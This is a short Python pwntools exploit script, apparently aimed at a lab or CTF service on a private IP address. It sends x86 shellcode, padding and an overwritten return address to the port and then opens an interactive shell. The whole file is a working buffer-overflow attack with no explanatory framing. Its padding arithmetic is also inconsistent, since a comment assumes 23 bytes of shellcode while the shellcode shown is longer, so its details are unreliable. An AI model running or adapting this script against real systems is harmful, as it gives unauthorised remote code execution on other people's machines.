#!/usr/bin/env python

from pwn import *

host = '192.168.1.132'
port = 6514

# Define the buffer size
buffer_size = 39

# Calculate the necessary padding length
padding_length = buffer_size - 23  # Assuming 23 bytes for the shellcode

# Craft the payload
eip = b'\x50\x16\x40\x00'  # Little-endian address you provided
shellcode = b'\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x50\x6a\x6e\x66\x68\x2d\x68\x89\xe3\x50\x68\x2f\x62\x69\x6e\x68\x2f\x73\x68\x68\x89\xe1\xb0\x0b\x52\x53\x89\xe1\xcd\x80'
payload = shellcode + b'A' * padding_length + eip  # Padding followed by the address

# Print the length of the payload
print("Payload length:", len(payload), "bytes")

# Establish connection to remote host
s = remote(host, port)

# Send the payload
s.send(payload)

# Start an interactive session
s.interactive()
